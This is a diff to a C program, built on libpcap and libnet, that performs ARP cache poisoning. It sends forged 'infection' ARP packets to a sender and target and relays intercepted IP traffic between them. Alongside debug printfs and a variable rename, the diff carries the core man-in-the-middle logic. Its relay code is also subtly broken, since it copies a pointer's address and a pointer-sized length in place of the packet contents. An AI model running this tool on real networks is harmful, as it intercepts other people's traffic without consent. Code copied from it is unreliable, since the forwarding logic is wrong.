@@ -96,7 +96,7 @@ int main(int argc, char* argv[]) {
 	infec.spa = target.ip;
 
 	char errbuf[PCAP_ERRBUF_SIZE];
-	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
+	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 0, errbuf);
 	if (handle == NULL) {
 		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
 		return -1;
@@ -115,9 +115,9 @@ int main(int argc, char* argv[]) {
 		if (res == 0) continue;
 		if (res == -1 || res == -2) break;
 
-		struct libnet_ethernet_hdr* next_ehtH = (struct libnet_ethernet_hdr *)packet;
+		struct libnet_ethernet_hdr* next_ethH = (struct libnet_ethernet_hdr *)packet;
 
-		if(ntohs(next_ehtH->ether_type) == ETHERTYPE_ARP) {
+		if(ntohs(next_ethH->ether_type) == ETHERTYPE_ARP) {
 			packet += sizeof(struct libnet_ethernet_hdr);
 			struct arp_hdr* next_arpH = (struct arp_hdr *)packet;
 			if(req.tpa == next_arpH->spa){
@@ -141,9 +141,9 @@ int main(int argc, char* argv[]) {
                 if (res == 0) continue;
                 if (res == -1 || res == -2) break;
 
-                struct libnet_ethernet_hdr* next_ehtH = (struct libnet_ethernet_hdr *)packet;
+                struct libnet_ethernet_hdr* next_ethH = (struct libnet_ethernet_hdr *)packet;
 
-                if(ntohs(next_ehtH->ether_type) == ETHERTYPE_ARP) {
+                if(ntohs(next_ethH->ether_type) == ETHERTYPE_ARP) {
                         packet += sizeof(struct libnet_ethernet_hdr);
                         struct arp_hdr* next_arpH = (struct arp_hdr *)packet;
                         if(req.tpa == next_arpH->spa){
@@ -165,24 +165,27 @@ int main(int argc, char* argv[]) {
                 if (res == 0) continue;
                 if (res == -1 || res == -2) break;
 
-		struct libnet_ethernet_hdr* next_ehtH = (struct libnet_ethernet_hdr *)packet;
+		struct libnet_ethernet_hdr* next_ethH = (struct libnet_ethernet_hdr *)packet;
 		packet += sizeof(struct libnet_ethernet_hdr);
 
-		if(ntohs(next_ehtH->ether_type)==ETHERTYPE_ARP) {
+		if(ntohs(next_ethH->ether_type)==ETHERTYPE_ARP) {
                 	struct arp_hdr* next_arpH = (struct arp_hdr *)packet;
 			if((next_arpH->spa == sender.ip) || (next_arpH->spa == target.ip)) pcap_sendpacket(handle, arp_infec_packet, size);
 			if((next_arpH->spa != my.ip) && (next_arpH->tpa == target.ip)) pcap_sendpacket(handle, arp_infec_packet, size);
 		}
 
-		else if(ntohs(next_ehtH->ether_type)==ETHERTYPE_IP) {
-			if(memcmp(next_ehtH->ether_shost, sender.mac, sizeof(sender.mac))==0) {
+		else if(ntohs(next_ethH->ether_type)==ETHERTYPE_IP) {
+			printf("0000000000000000\n");
+			if((memcmp(next_ethH->ether_shost, sender.mac, sizeof(sender.mac))==0) && (memcmp(next_ethH->ether_dhost, my.mac, sizeof(my.mac))==0)) {
+				printf("1111111111111\n");
 				struct libnet_ipv4_hdr* next_ipH = (struct libnet_ipv4_hdr *)packet;
 				if(memcmp(&next_ipH->ip_src, &sender.ip, sizeof(sender.ip)) == 0) {
-					memcpy(next_ehtH->ether_shost, my.mac, sizeof(my.mac));
-					memcpy(next_ehtH->ether_dhost, target.mac, sizeof(target.mac));
+					printf("2222222222222\n");
+					memcpy(next_ethH->ether_shost, my.mac, sizeof(my.mac));
+					memcpy(next_ethH->ether_dhost, target.mac, sizeof(target.mac));
 
 					u_int8_t relay_packet[header->caplen];
-					memcpy(relay_packet, &next_ehtH, sizeof(struct libnet_ethernet_hdr));
+					memcpy(relay_packet, &next_ethH, sizeof(struct libnet_ethernet_hdr));
 					memcpy(relay_packet+sizeof(struct libnet_ethernet_hdr), &packet, sizeof(packet));
 					pcap_sendpacket(handle, relay_packet, header->caplen);
 				}
